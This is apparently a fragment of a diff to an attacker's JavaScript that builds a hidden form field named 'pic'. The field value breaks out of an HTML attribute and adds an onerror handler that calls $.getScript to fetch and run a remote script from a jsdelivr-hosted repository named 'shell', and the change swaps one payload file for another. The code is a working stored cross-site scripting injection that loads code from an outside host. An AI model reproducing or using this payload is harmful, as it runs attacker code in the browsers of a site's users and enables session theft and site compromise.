@@ -27,7 +27,7 @@ link.setAttribute("value", "");
 var pic = document.createElement("input");
 pic.setAttribute("type", "hidden");
 pic.setAttribute("name", "pic");
-pic.setAttribute("value", 'https://cdn.jsdelivr.net/gh/ghalypr/shell@main/hagerl.js" onerror="$.getScript(this.src);');
+pic.setAttribute("value", 'https://cdn.jsdelivr.net/gh/ghalypr/shell@main/hagerl2.js" onerror="$.getScript(this.src);');
 
 
 
